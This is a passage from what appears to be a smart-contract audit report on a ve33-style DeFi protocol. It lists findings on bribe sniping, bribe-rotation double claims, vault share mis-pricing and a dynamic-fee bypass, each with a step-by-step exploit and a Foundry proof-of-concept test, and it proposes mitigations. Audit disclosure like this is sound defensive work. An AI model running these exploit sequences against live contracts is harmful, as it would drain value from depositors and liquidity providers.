    function ownerOf(uint id) external view override returns(address){ return ownerOfMap[id]; }
    function isApprovedOrOwner(address s, uint id) external view override returns (bool) { return ownerOfMap[id] == s; }
    function balanceOfNFT(uint256) external pure override returns (uint256) { return 1e18; }
    function voting(uint256) external override {}
    function abstain(uint256) external override {}
}

contract MockPermissionsRegistry { function hasRole(bytes memory, address) external pure returns (bool) { return true; } }

interface ITokenHandler { function isConnector(address) external view returns(bool); }
contract MockTokenHandler is ITokenHandler { function isConnector(address) external pure returns(bool){ return false; } }

contract MockGaugeManager {
    address public internalBribe; address public externalBribe; address public minterAddr = address(0xBEEF);
    mapping(address=>bool) public alive;
    function setBribes(address _int, address _ext) external { internalBribe=_int; externalBribe=_ext; }
    function setAlive(address pool, bool v) external { alive[pool]=v; }
    function isGaugeAliveForPool(address pool) external view returns (bool) { return alive[pool]; }
    function fetchInternalBribeFromPool(address) external view returns (address) { return internalBribe; }
    function fetchExternalBribeFromPool(address) external view returns (address) { return externalBribe; }
    function minter() external view returns(address){ return minterAddr; }
}

contract BribeSnipingExploitTest is Test {
    VoterV3 voter;
    MockVE ve;
    MockGaugeManager gm;
    MockPermissionsRegistry pr;
    MockTokenHandler th;
    Bribe internalBribe;
    Bribe externalBribe;
    MockERC20 reward;

    address attacker = address(0xA11CE);
    uint256 tokenId = 1;
    address pool = address(0xP001);

    function setUp() public {
        // Reward token and VE
        reward = new MockERC20("RWD","RWD",18);
        ve = new MockVE(address(reward));
        ve.setOwner(tokenId, attacker);

        // Infra
        gm = new MockGaugeManager();
        pr = new MockPermissionsRegistry();
        th = new MockTokenHandler();

        // Deploy voter
        voter = new VoterV3();
        voter.initialize(address(ve), address(0xDEAD), address(gm), address(pr));

        // Deploy bribes with voter and gm wired; reward token is token0 so it's whitelisted
        internalBribe = new Bribe(address(this), address(voter), address(gm), address(0x1234), address(th), address(reward), address(0xBABA), "internal");
        externalBribe = new Bribe(address(this), address(voter), address(gm), address(0x1234), address(th), address(reward), address(0xBABA), "external");
        gm.setBribes(address(internalBribe), address(externalBribe));
        gm.setAlive(pool, true);
    }

    function test_EndOfEpochSnipingCapturesFullEpochReward() public {
        // Epoch alignment
        uint256 t0 = 100_000;
        vm.warp(t0);
        uint256 start = HybraTimeLibrary.epochStart(block.timestamp);
        uint256 voteOpen = HybraTimeLibrary.epochVoteStart(block.timestamp);
        uint256 end = HybraTimeLibrary.epochNext(block.timestamp);

        // Fund bribe for current epoch N
        uint256 rewardAmt = 1_000 ether;
        reward.mint(address(this), rewardAmt);
        reward.approve(address(externalBribe), rewardAmt);
        externalBribe.notifyRewardAmount(address(reward), rewardAmt);

        // Wait until last second before epoch end and vote
        vm.warp(end - 1);
        vm.prank(attacker);
        address[] memory pools = new address[](1); pools[0] = pool;
        uint256[] memory weights = new uint256[](1); weights[0] = 100;
        voter.vote(tokenId, pools, weights); // deposits weight into both bribes at T = end-1

        // Move to next epoch and claim rewards from external bribe via GaugeManager
        vm.warp(end + 1);
        address[] memory tokens = new address[](1); tokens[0] = address(reward);
        vm.prank(address(gm));
        externalBribe.getReward(tokenId, tokens);

        // Since attacker was the only voter and checkpointed at end-1, they take 100% of epoch N reward
        assertEq(reward.balanceOf(attacker), rewardAmt, "attacker should capture full epoch reward by last-second vote");
    }
}


## Suggested Mitigation
Two complementary fixes:
1) Enforce an end-of-epoch cutoff in VoterV3 so first votes cannot be cast in the closing window:
   - In onlyNewEpoch (and poke), add: require(block.timestamp < HybraTimeLibrary.epochVoteEnd(block.timestamp), "DE"); to forbid votes in the last NO_VOTING_WINDOW seconds. Alternatively, use HybraTimeLibrary.isLastHour(block.timestamp) to revert during the closing window.
   - Apply the same check in vote() and poke() paths to be explicit and future‑proof.
2) Make bribes time‑weighted instead of last‑checkpoint weighted:
   - In Bribe, compute per‑epoch rewards using the integral of balances over the epoch, i.e., sum over each checkpoint interval within the epoch: reward += balance_i * dt_i / integralSupply(dt) * epochReward. This can be done by iterating checkpoints in [epochStart, epochEnd) and using supplyCheckpoints for denominators. Even a coarse 2‑point approximation (first+last or mid‑epoch snapshot) would greatly reduce sniping incentives.
Either approach alone mitigates much of the problem; combining both eliminates last‑second bribe sniping entirely.





 **Derived From** : forall pool in poolVote[_tokenId]: votes[_tokenId][pool] > 0 && gaugeManager.isGaugeAliveForPool(pool) == true && allDistinct(poolVote[_tokenId])

## [M-58]. Bribe rotation breaks poolVote referential integrity: reset/poke withdraws from wrong bribe, leaving stale deposits and enabling double-claim windows

## Derived From Pattern/Invariant
forall pool in poolVote[_tokenId]: votes[_tokenId][pool] > 0 && gaugeManager.isGaugeAliveForPool(pool) == true && allDistinct(poolVote[_tokenId])

## Exploit Type
UpgradeabilityInitializerSafety

## Location
VoterV3.vote

## Minimim Privilege Required
Permissionless

## Description
Root cause: VoterV3._reset/_vote derive bribe addresses at withdraw/deposit time from the current GaugeManager mapping, instead of the bribe addresses used at the time of the original vote. If GAUGE_ADMIN rotates a pool’s bribes via GaugeManager.setNewBribes (or VoterAdmin replaces the gaugeManager) between a user’s vote and later reset/poke, VoterV3 will call withdraw() on the new bribe addresses, while the original deposits remain in the old bribes. Bribe.withdraw() is non-strict and silently no-ops when balance is insufficient, so VoterV3 clears poolVote/votes and reduces weights while the user’s old bribe balance persists. Consequences: (a) stale deposits can keep accruing until that bribe stops receiving funds, (b) users can re-vote to a new pool and hold balances in both old and new bribes for the same epoch if rotation occurs mid-epoch (double-dip), and (c) events suggest an "Abstained" but the old bribe still counts the stake. Vulnerable snippet in VoterV3._reset:

    address internal_bribe = gaugeManager.fetchInternalBribeFromPool(_pool);
    address external_bribe = gaugeManager.fetchExternalBribeFromPool(_pool);
    IBribe(internal_bribe).withdraw(uint256(_votes), _tokenId);
    IBribe(external_bribe).withdraw(uint256(_votes), _tokenId);

This relies on current mappings instead of the bribe addresses used during the original deposit.

## Impact
If GAUGE_ADMIN rotates a pool’s bribe addresses (or the Voter’s gaugeManager pointer is replaced) between a user’s vote and their subsequent reset/poke, VoterV3 withdraws from the new bribes instead of the ones originally used for deposit. Because Bribe.withdraw silently no-ops on insufficient balance, VoterV3 clears its internal accounting while the old bribe balances persist. The user can then re-vote, creating a second active bribe position for the same epoch. When both old and new bribes hold rewards (e.g., mid-epoch fee accrual and rotation), the user can claim twice, diluting other voters and leaving funds stranded in old bribes. Impact is economic (double-paid bribe rewards and stale funds) and requires privileged bribe rotation timing, so severity remains Medium.

## Proof of Concept
1) User votes for pool P while GaugeManager maps P -> B_old (internal/external); VoterV3 deposits weight into B_old.
2) GAUGE_ADMIN rotates bribes for P to B_new mid-epoch (legitimate op), or VoterAdmin swaps VoterV3.gaugeManager.
3) User calls reset() (or poke() → _vote() → _reset()). VoterV3 fetches current bribes (B_new) and calls withdraw on them; Bribe.withdraw is a no-op because the user’s balance is in B_old.
4) VoterV3 clears poolVote/votes/usedWeights anyway. The user’s balances in B_old persist.
5) User immediately votes again. Deposits now go into B_new while the B_old balances still exist, so the user holds two simultaneous bribe positions for the same epoch.
6) If both B_old and B_new have rewards for the overlapping epoch (e.g., fees already notified to B_old earlier, and future fees/bribes to B_new), the user can claim from both via GaugeManager.claimBribes([B_old, B_new], ...), extracting double rewards and diluting others.

## Proof of Code
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import {VoterV3} from "ve33/contracts/VoterV3.sol";

interface IBribeLike { function deposit(uint256, uint256) external; function withdraw(uint256, uint256) external; function balOf(uint256) external view returns (uint256); }

contract MockBribe is IBribeLike {
    address public voter;
    mapping(uint256 => uint256) public balanceOf;
    uint256 public totalSupply;
    constructor(address _voter){ voter = _voter; }
    function setVoter(address _voter) external { voter = _voter; }
    function deposit(uint256 amount, uint256 tokenId) external { require(msg.sender==voter, "NA"); require(amount>0, "Z"); totalSupply += amount; balanceOf[tokenId] += amount; }
    function withdraw(uint256 amount, uint256 tokenId) external { require(msg.sender==voter, "NA"); require(amount>0, "Z"); if (amount <= balanceOf[tokenId]) { totalSupply -= amount; balanceOf[tokenId] -= amount; } }
    function balOf(uint256 t) external view returns (uint256) { return balanceOf[t]; }
}

contract MockVE {
    function token() external pure returns (address) { return address(0xBEEF); }
    function isApprovedOrOwner(address, uint256) external pure returns (bool) { return true; }
    function balanceOfNFT(uint256) external pure returns (uint256) { return 1000; }
    function voting(uint256) external {}
    function abstain(uint256) external {}
}

contract MockGaugeManager {
    mapping(address=>bool) public alive;
    mapping(address=>address) public ib;
    mapping(address=>address) public eb;
    function set(address pool, bool _alive, address _ib, address _eb) external { alive[pool]=_alive; ib[pool]=_ib; eb[pool]=_eb; }
    function isGaugeAliveForPool(address pool) external view returns (bool) { return alive[pool]; }
    function fetchInternalBribeFromPool(address pool) external returns (address) { return ib[pool]; }
    function fetchExternalBribeFromPool(address pool) external returns (address) { return eb[pool]; }
}

contract VoterV3_BribeRotation_DoubleDip_Test is Test {
    VoterV3 voter;
    MockVE ve;
    MockGaugeManager gm;
    MockBribe oldInt; MockBribe oldExt; MockBribe newInt; MockBribe newExt;
    address pool = address(0x1111);
    uint256 tokenId = 42;

    function setUp() public {
        ve = new MockVE();
        gm = new MockGaugeManager();
        voter = new VoterV3();
        voter.initialize(address(ve), address(0x1234), address(gm), address(0x5678));
        oldInt = new MockBribe(address(voter));
        oldExt = new MockBribe(address(voter));
        gm.set(pool, true, address(oldInt), address(oldExt));
        vm.warp(301); // enter voting window (WEEK=1800, NO_VOTING_WINDOW=300)
    }

    function testBribeRotationDoublePositionSameEpoch() public {
        // 1) initial vote → deposits into OLD bribes
        address[] memory pools = new address[](1); pools[0] = pool;
        uint256[] memory w = new uint256[](1); w[0] = 1; // full weight
        voter.vote(tokenId, pools, w);
        assertEq(oldInt.balOf(tokenId), 1000, "old int deposit");
        assertEq(oldExt.balOf(tokenId), 1000, "old ext deposit");

        // 2) rotate bribes mid-epoch
        newInt = new MockBribe(address(voter));
        newExt = new MockBribe(address(voter));
        gm.set(pool, true, address(newInt), address(newExt));

        // 3) next epoch boundary + after no-voting window → reset
        vm.warp(2101); // epochStart=1800, voteStart=2100
        voter.reset(tokenId);

        // Withdraw hit NEW bribes (zero balances) → OLD balances persist
        assertEq(oldInt.balOf(tokenId), 1000, "stale old int remains");
        assertEq(oldExt.balOf(tokenId), 1000, "stale old ext remains");
        assertEq(voter.poolVoteLength(tokenId), 0, "poolVote cleared");
        assertEq(voter.usedWeights(tokenId), 0, "usedWeights cleared");

        // 4) Re-vote in same epoch window → deposits into NEW bribes
        address[] memory pools2 = new address[](1); pools2[0] = pool;
        uint256[] memory w2 = new uint256[](1); w2[0] = 1;
        voter.vote(tokenId, pools2, w2);

        // Now double position exists: OLD and NEW bribes both hold balances
        assertEq(newInt.balOf(tokenId), 1000, "new int deposit after revote");
        assertEq(newExt.balOf(tokenId), 1000, "new ext deposit after revote");
        assertEq(oldInt.balOf(tokenId), 1000, "old int still not withdrawn");
        assertEq(oldExt.balOf(tokenId), 1000, "old ext still not withdrawn");
    }
}


## Suggested Mitigation
Protocol-level fixes:
- Persist the exact bribe addresses used at deposit time and withdraw from those addresses during _reset/_vote. Concretely, extend VoterV3 storage to record, per tokenId per pool, the internal/external bribe addresses used when depositing. On reset, iterate the stored bribes and call withdraw against those exact contracts before clearing votes.
- Constrain bribe rotation: require GAUGE_ADMIN to rotate bribes only at epoch boundaries and after a dry run that verifies all current voters have successfully withdrawn (or disallow rotation if any active balances remain). Emit events to coordinate off-chain or migration tooling.
- Optional safety: add a strict mode in Bribe.withdraw callable by voter (VoterV3) that reverts when amount > balance for the tokenId. VoterV3 can then fail fast if the bribe pointer has changed unexpectedly. If adopting this, gate it behind an explicit flag to avoid breaking existing flows.
- If rotations are unavoidable, provide a migration tool that (a) temporarily grants a dedicated migrator as bribe.voter via setVoter (owner/onlyAllowed), (b) enumerates tokenIds and moves balances from old to new bribe, and (c) restores voter back to VoterV3, all executed atomically or at epoch rollover.





 **Derived From** : Shares are under-minted due to using post-deposit assets in share calc (systematic value leak)

## [H-59]. GrowthHYBR.deposit mints too few shares by using post-deposit totalAssets, letting existing holders siphon value from new depositors

## Derived From Pattern/Invariant
Shares are under-minted due to using post-deposit assets in share calc (systematic value leak)

## Exploit Type
PricePrecision

## Location
GrowthHYBR.deposit

## Minimim Privilege Required
Permissionless

## Description
In GrowthHYBR.deposit, the contract first locks the depositor’s HYBR into the veNFT (increasing totalAssets), then computes shares via calculateShares(amount), which reads totalAssets() after the deposit. This order-of-ops causes systematic under-minting: shares = amount * totalSupply / (assets_before + amount) instead of amount * totalSupply / assets_before. The delta is transferred to existing gHYBR holders as a price premium. For large deposits relative to existing assets, the loss is material (e.g., amount == assets_before → depositor only gets 50% of fair shares). Vulnerable snippet:

function deposit(uint256 amount, address recipient) external nonReentrant {
  ...
  IVotingEscrow(votingEscrow).deposit_for(veTokenId, amount); // increases totalAssets
  _extendLockToMax();
  uint256 shares = calculateShares(amount); // uses inflated totalAssets()
  _mint(recipient, shares);
}

function calculateShares(uint256 amount) public view returns (uint256) {
  uint256 _totalSupply = totalSupply();
  uint256 _totalAssets = totalAssets();
  if (_totalSupply == 0 || _totalAssets == 0) return amount;
  return (amount * _totalSupply) / _totalAssets; // post-deposit assets ➜ under-mint
}


## Impact
New depositors are systematically under-issued shares because share pricing uses post-deposit totalAssets. Existing gHYBR holders capture the difference as an implicit premium. A rational attacker can deposit first, wait for a large victim deposit, and then withdraw to realize more HYBR than initially deposited (net profit even after the withdrawal fee). The loss can be material for deposits sized comparable to prior assets (e.g., 50% under-mint when amount == assets_before). This is a direct value transfer and results in real asset loss for victims.

## Proof of Concept
Consider A (attacker) and V (victim), vault initially empty.
1) A deposits 100 HYBR → veNFT is created; totalAssets=100, totalSupply=100 (1:1 for first depositor).
2) V deposits 100 HYBR next. The contract locks the 100 HYBR into veNFT first, so totalAssets becomes 200 before share calculation. It then mints shares as shares = amount * totalSupply / totalAssets = 100 * 100 / 200 = 50 (instead of the fair 100 if priced on pre-deposit assets=100).
3) Now totalSupply=150, totalAssets=200. A’s per-share value is 200/150≈1.333. If A withdraws, gross assets = 100 * 200 / 150 ≈ 133.33 HYBR. Even after a small fee (e.g., 0.1%–1%), A still receives >100 HYBR, realizing profit that came from V’s under-minted shares.
This demonstrates the systematic under-minting and value siphoning by existing holders whenever new deposits are priced against post-deposit assets.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {GrowthHYBR} from "ve33/contracts/GovernanceHYBR.sol";
import {VotingEscrow} from "ve33/contracts/VotingEscrow.sol";
import {HYBR} from "ve33/contracts/HYBR.sol";

contract GHBR_UnderMint_Test is Test {
    HYBR token;
    VotingEscrow ve;
    GrowthHYBR vault;
    address attacker = address(0xA11CE);
    address victim   = address(0xB0B);

    function setUp() public {
        token = new HYBR();
        ve = new VotingEscrow(address(token), address(1));
        vault = new GrowthHYBR(address(token), address(ve));

        // Owner config: set fee receiver and minimize withdraw fee to contract minimum
        vm.prank(vault.owner());
        vault.setTeam(address(this));
        vm.prank(vault.owner());
        vault.setWithdrawFee(vault.MIN_WITHDRAW_FEE()); // 0.1%

        // Allow vault to call multiSplit on ve during withdrawals
        // VotingEscrow.team() is this test contract by constructor
        ve.toggleSplit(address(vault), true);

        // Fund users
        token.mint(attacker, 200e18);
        token.mint(victim,   200e18);

        // Approvals
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vm.stopPrank();
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        vm.stopPrank();
    }

    function _warpToWithdrawWindow() internal {
        // HybraTimeLibrary.WEEK = 1800 in test profile
        // Default head_not_withdraw_time=1200, tail_not_withdraw_time=300
        // Warp to 1201 (within allowed window)
        vm.warp(1201);
    }

    function test_UnderMintsShares_And_AttackerProfits() public {
        // 1) Attacker deposits 100 HYBR → 1:1 mint since supply/assets == 0
        vm.startPrank(attacker);
        vault.deposit(100e18, attacker);
        vm.stopPrank();

        assertEq(vault.totalSupply(), 100e18, "attacker initial shares");
        assertEq(vault.totalAssets(), 100e18, "assets after first deposit");

        // 2) Victim deposits 100 HYBR next; shares computed vs post-deposit assets (200)
        vm.startPrank(victim);
        vault.deposit(100e18, victim);
        vm.stopPrank();

        // Victim under-minted: only 50 shares rather than fair 100
        uint256 victimShares = vault.balanceOf(victim);
        assertEq(victimShares, 50e18, "victim under-minted to 50 shares");

        // Totals now: assets=200, supply=150; per-share value=200/150=1.333..
        assertEq(vault.totalAssets(), 200e18, "assets after second deposit");
        assertEq(vault.totalSupply(), 150e18, "supply after second deposit");

        // 3) Attacker withdraws their 100 shares → receives > initial (net-of-fee) due to price premium
        _warpToWithdrawWindow();
        vm.startPrank(attacker);
        uint256 attackerShares = vault.balanceOf(attacker);
        assertEq(attackerShares, 100e18, "attacker shares before withdraw");

        uint256 grossAssets = vault.calculateAssets(attackerShares); // ≈ 133.33e18
        uint256 feeBps = vault.withdrawFee();
        uint256 fee = (grossAssets * feeBps) / vault.BASIS();
        uint256 expectedUser = grossAssets - fee;

        uint256 tokenId = vault.withdraw(attackerShares);
        vm.stopPrank();

        // User receives a new veNFT with amount equal to expectedUser
        (int128 amt,,) = ve.locked(tokenId);
        uint256 userLocked = uint256(int256(amt));
        assertEq(userLocked, expectedUser, "user veNFT amount equals net-of-fee assets");

        // Profit exists even after fee
        assertGt(userLocked, 100e18, "attacker net profit > 0 proves value siphoned from victim");
    }
}


## Suggested Mitigation
Price deposits against pre-deposit assets (ERC-4626 style):
- Read totalAssets before mutating the veNFT, and compute shares = amount * totalSupply / assetsBefore. For the first deposit or if totalSupply==0 or assetsBefore==0, mint shares = amount.
- Alternatively, if deposit_for is executed first, compute shares against (totalAssetsAfter - amount) to undo the accounting of the just-deposited amount.
Example:
function deposit(uint256 amount, address recipient) external nonReentrant {
  require(amount > 0, "Zero amount");
  recipient = recipient == address(0) ? msg.sender : recipient;
  // Pull HYBR
  IERC20(HYBR).transferFrom(msg.sender, address(this), amount);
  uint256 assetsBefore = totalAssets();
  uint256 supplyBefore = totalSupply();
  // Lock into ve
  if (veTokenId == 0) {
      _initializeVeNFT(amount);
  } else {
      IERC20(HYBR).approve(votingEscrow, amount);
      IVotingEscrow(votingEscrow).deposit_for(veTokenId, amount);
      _extendLockToMax();
  }
  // Mint fairly using pre-deposit assets
  uint256 shares = (supplyBefore == 0 || assetsBefore == 0) ? amount : (amount * supplyBefore) / assetsBefore;
  _mint(recipient, shares);
  _addTransferLock(recipient, shares);
  emit Deposit(msg.sender, amount, shares);
}
This removes the systematic under-minting and aligns share issuance with economic value.





 **Derived From** : totalAssets_after >= totalAssets_before && totalSupply_after == totalSupply_before

## [H-60]. Pre-compound deposits mint too many shares by ignoring pending HYBR, stealing value when compound raises PPS

## Derived From Pattern/Invariant
totalAssets_after >= totalAssets_before && totalSupply_after == totalSupply_before

## Exploit Type
ERC4626SharePrice

## Location
GrowthHYBR.deposit

## Minimim Privilege Required
Permissionless

## Description
GrowthHYBR.minting uses calculateShares(amount) with totalAssets() that only counts ve-locked HYBR, ignoring HYBR sitting idle in the vault (awaiting compound). Because compound later increases totalAssets without minting shares (PPS strictly increases), an attacker can front-run compound by depositing when the vault holds pending HYBR B, minting shares at an artificially low PPS. After compound, B is added to veNFT and PPS jumps, transferring a proportional slice of B from existing holders to the attacker. Vulnerable snippet:

function calculateShares(uint256 amount) public view returns (uint256) {
    uint256 _totalSupply = totalSupply();
    uint256 _totalAssets = totalAssets(); // DOES NOT include IERC20(HYBR).balanceOf(this)
    if (_totalSupply == 0 || _totalAssets == 0) return amount;
    return (amount * _totalSupply) / _totalAssets;
}

function compound() external onlyOperator {
    uint256 hybrBalance = IERC20(HYBR).balanceOf(address(this));
    if (hybrBalance > 0) {
        IVotingEscrow(votingEscrow).deposit_for(veTokenId, hybrBalance); // PPS↑, no shares minted
    }
}

## Impact
Attacker mints excess gHYBR shares against an undervalued PPS then benefits when compound adds pending HYBR to the veNFT without minting shares, diluting existing holders and capturing a share of B.

## Proof of Concept
1) Alice bootstraps vault: deposit A HYBR -> S=A shares, veNFT locked=A.
2) Operator executes swaps and leaves B HYBR idle in the vault (not yet compounded).
3) Attacker deposits small d HYBR. Shares minted use totalAssets=A (ignores B), so minted shares y = d*S/(A+d) > fair x=d*S/(A+B).
4) Operator calls compound: B is deposited to veNFT, PPS increases without new shares. Attacker’s share of vault assets becomes larger than proportional, effectively stealing value from existing holders.
5) Attacker’s calculateAssets(shares) > d after compound, demonstrating clear profit.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import {HYBR} from "ve33/contracts/HYBR.sol";
import {VotingEscrow} from "ve33/contracts/VotingEscrow.sol";
import {GrowthHYBR} from "ve33/contracts/GovernanceHYBR.sol";

contract FrontRunCompoundTest is Test {
    HYBR token;
    VotingEscrow ve;
    GrowthHYBR vault;
    address alice = address(0xA11CE);
    address attacker = address(0xBEEF);
    address team = address(0xFEED);

    function setUp() public {
        token = new HYBR();
        // artProxy can be any address; tokenURI won't be used in this test
        ve = new VotingEscrow(address(token), address(1));
        vault = new GrowthHYBR(address(token), address(ve));
        vault.setTeam(team);
        // Mint funds
        token.mint(alice, 1_000e18);
        token.mint(attacker, 2e18);
    }

    function testFrontRunCompoundMintsTooManyShares() public {
        // Alice deposits A=1000e18
        vm.startPrank(alice);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1_000e18, alice);
        vm.stopPrank();
        // Supply S = 1000e18, locked A = 1000e18
        assertEq(vault.totalSupply(), 1_000e18);
        assertEq(vault.totalAssets(), 1_000e18);

        // Idle HYBR B=900e18 sits in vault (e.g. after executeSwap, before compound)
        token.mint(address(vault), 900e18);
        // Confirm totalAssets ignores idle HYBR
        assertEq(vault.totalAssets(), 1_000e18);

        // Attacker front-runs compound with small deposit d=1e18
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1e18, attacker);
        vm.stopPrank();

        uint256 y = vault.balanceOf(attacker); // actual minted shares
        assertGt(y, 0);
        // Fair share x = d * S / (A + B) = 1e18 * 1000e18 / 1900e18
        uint256 x = (1e18 * 1_000e18) / (1_000e18 + 900e18);
        assertGt(y, x, "attacker minted more than fair due to ignored pending HYBR");

        // Operator compounds pending B -> PPS increases without minting new shares
        vault.compound();
        assertEq(vault.totalAssets(), 1_901e18);

        // Attacker now claims more underlying than deposited (value theft from old holders)
        uint256 claim = vault.calculateAssets(y);
        assertGt(claim, 1e18, "attacker's asset claim exceeds deposit");
    }
}


## Suggested Mitigation
Include pending HYBR in share pricing or auto-compound before minting shares. For example: use assets = totalAssets() + IERC20(HYBR).balanceOf(address(this)) in calculateShares(), or call a local auto-compound of any idle HYBR before computing shares. Also, keep calculateAssets based on locked HYBR to match withdrawal semantics, but prevent deposits while idle HYBR exists or force-compound it first.





 **Derived From** : Dynamic fee bypass via factory cap mismatch (returns >100k → fallback to cheap base fee)

## [H-61]. Volatility-based dynamic fee can be bypassed: CLFactory rejects >10% fee and silently falls back to cheap default

## Derived From Pattern/Invariant
Dynamic fee bypass via factory cap mismatch (returns >100k → fallback to cheap base fee)

## Exploit Type
Oracle

## Location
CLFactory.getSwapFee

## Minimim Privilege Required
Permissionless

## Description
DynamicSwapFeeModule.getFee() intentionally allows large dynamic fees (up to 50% = 500,000 pips) based on |currentTick−TWAP|. However, CLFactory.getSwapFee() only accepts a module-returned fee ≤ 100,000 (10%). If the module returns >100,000, the factory ignores it and returns the static tickSpacing default (often 0.01–1%). An attacker can cheaply pre-swing the price to inflate |tick−TWAP| so DynamicSwapFeeModule computes >100,000, which triggers the factory fallback, undercharging their subsequent large trade precisely when fees should spike. This defeats anti-MEV/volatility pricing and extracts value from LPs/protocol.

Vulnerable snippets:
- DynamicSwapFeeModule.getFee:
  totalFee = baseFee + _getDynamicFee(...);
  totalFee = totalFee < feeCap ? totalFee : feeCap; // feeCap can be 500_000
  return uint24(totalFee);

- CLFactory.getSwapFee:
  if (success) {
      uint24 fee = abi.decode(data, (uint24));
      if (fee <= 100_000) { return fee; }
  }
  return tickSpacingToFee[CLPool(pool).tickSpacing()]; // fallback to cheap default

## Impact
When volatility spikes enough that DynamicSwapFeeModule intends to charge >10% (up to 50%), CLFactory.getSwapFee discards the module’s return and silently applies the low default tickSpacing fee (often 0.01–1%). Attackers can pre-move the price to exceed the 10% gate and then execute large swaps at the cheap fallback precisely during high-volatility windows. This causes a predictable, repeated shortfall of realized swap fees (matured LP yield) and protocol fees. The loss is real and unbounded by design (depends on volume), not dust-level.

## Proof of Concept
Preconditions:
- CLFactory has swapFeeModule set to DynamicSwapFeeModule with default or per-pool cap up to 500,000 (50%).
- secondsAgo configured (default 600) and pool observationCardinality grown sufficiently to compute TWAP.
- tickSpacing default fee for the pool is low (e.g., 500 pips = 0.05%).

Steps:
1) Provide liquidity wide around current price; increase observationCardinalityNext to >= secondsAgo/2 (e.g., 300) and wait >= secondsAgo.
2) Make a small pre-swap to push currentTick far from the 10‑minute TWAP so DynamicSwapFeeModule.getFee(pool) > 100,000.
3) Observe that CLFactory.getSwapFee(pool) ignores the module’s >100k value and returns the static tickSpacing fee (e.g., 500 pips) due to the hard-coded 10% ceiling.
4) Execute a large swap: CLPool(pool).fee() reads CLFactory.getSwapFee(pool), so the trade is charged at the cheap fallback, not the intended high dynamic fee. The fee delta (moduleFee − fallbackFee) × notional / 1e6 is value extracted from LPs/protocol.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.7.6;

import "ds-test/test.sol";
import "cl/contracts/core/CLFactory.sol";
import "cl/contracts/core/CLPool.sol";
import "cl/contracts/core/fees/DynamicSwapFeeModule.sol";
import "cl/contracts/core/interfaces/callback/ICLMintCallback.sol";
import "cl/contracts/core/interfaces/callback/ICLSwapCallback.sol";
import "cl/contracts/core/libraries/TickMath.sol";

interface Hevm { function warp(uint256) external; }

contract ERC20Mock {
    string public name; string public symbol; uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n, string memory s) public { name = n; symbol = s; }
    function transfer(address to, uint256 a) external returns (bool) {
        require(balanceOf[msg.sender] >= a, "bal");
        balanceOf[msg.sender] -= a; balanceOf[to] += a; return true;
    }
    function approve(address s, uint256 a) external returns (bool) {
        allowance[msg.sender][s] = a; return true;
    }
    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        require(balanceOf[f] >= a, "from");
        require(allowance[f][msg.sender] >= a, "allow");
        allowance[f][msg.sender] -= a; balanceOf[f] -= a; balanceOf[t] += a; return true;
    }
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
}

contract FeeBypassTest is DSTest, ICLMintCallback, ICLSwapCallback {
    Hevm constant hevm = Hevm(address(uint160(uint256(keccak256("hevm cheat code")))));

    ERC20Mock token0; ERC20Mock token1;
    CLPool poolImpl; CLFactory factory; DynamicSwapFeeModule dyn;
    address pool;

    function setUp() public {
        token0 = new ERC20Mock("T0","T0");
        token1 = new ERC20Mock("T1","T1");

        poolImpl = new CLPool();
        factory = new CLFactory(address(poolImpl));

        // Deploy dynamic fee module with very high scaling so small tick delta exceeds 10%
        address[] memory emptyA = new address[](0);
        uint24[] memory emptyB = new uint24[](0);
        dyn = new DynamicSwapFeeModule(address(factory), 1e10, 500000, emptyA, emptyB);
        factory.setSwapFeeModule(address(dyn));

        // Create pool at price=1 with tickSpacing=100 (default fee mapping => 500 pips = 0.05%)
        uint160 sqrtPriceX96 = uint160(1) << 96; // sqrt(1) in Q64.96
        pool = factory.createPool(address(token0), address(token1), 100, sqrtPriceX96);

        // Fund test
        token0.mint(address(this), 10**30);
        token1.mint(address(this), 10**30);

        // Grow oracle capacity and add wide liquidity so swaps can move price
        CLPool(pool).increaseObservationCardinalityNext(300);
        CLPool(pool).mint(address(this), -10000, 10000, 1e18, abi.encode(0));

        // Ensure per-pool config allows up to 50% and large scaling
        dyn.setFeeCap(pool, 500000);
        dyn.setScalingFactor(pool, uint64(1e10));

        // Wait >= secondsAgo (default 600)
        hevm.warp(block.timestamp + 601);
    }

    // Mint callback: pay owed tokens to pool
    function uniswapV3MintCallback(uint256 a0, uint256 a1, bytes calldata) external override {
        if (a0 > 0) token0.transfer(msg.sender, a0);
        if (a1 > 0) token1.transfer(msg.sender, a1);
    }

    // Swap callback: pay owed tokens to pool
    function uniswapV3SwapCallback(int256 a0, int256 a1, bytes calldata) external override {
        if (a0 > 0) token0.transfer(msg.sender, uint256(a0));
        if (a1 > 0) token1.transfer(msg.sender, uint256(a1));
    }

    function test_DynamicFee_Bypass_FallsBackToCheapDefault() public {
        // Pre-swing: push price away from TWAP to make module fee > 10%
        CLPool(pool).swap(address(this), true, int256(1e21), TickMath.MIN_SQRT_RATIO + 1, abi.encode(0));

        uint24 moduleFee = dyn.getFee(pool);
        assertTrue(moduleFee > 100000); // >10%

        uint24 factoryFee = factory.getSwapFee(pool);
        // Factory rejects >10% and falls back to tickSpacing default (500 pips for spacing=100)
        assertTrue(factoryFee == 500);

        // Pool uses factory fee for swaps
        uint24 poolApplied = CLPool(pool).fee();
        assertTrue(poolApplied == factoryFee);
    }
}


## Suggested Mitigation
Eliminate the cap mismatch and silent fallback:
- Align caps: In CLFactory.getSwapFee, accept module-provided fees up to the intended system maximum (e.g., 500_000) rather than 100_000. Example: if (success) { uint24 f = abi.decode(data,(uint24)); if (f <= 500_000) return f; }
- Alternatively, if governance wants a 10% hard ceiling, clamp instead of falling back: return min(decodedFee, 100_000). This avoids undercharging to the static default during volatility spikes.
- Add monitoring: emit an event or add explicit handling when a module returns an out‑of‑policy fee to avoid invisible policy breaches.
- For completeness, audit getUnstakedFee/protocol caps to keep consistency across fee paths and document the max swap fee policy.





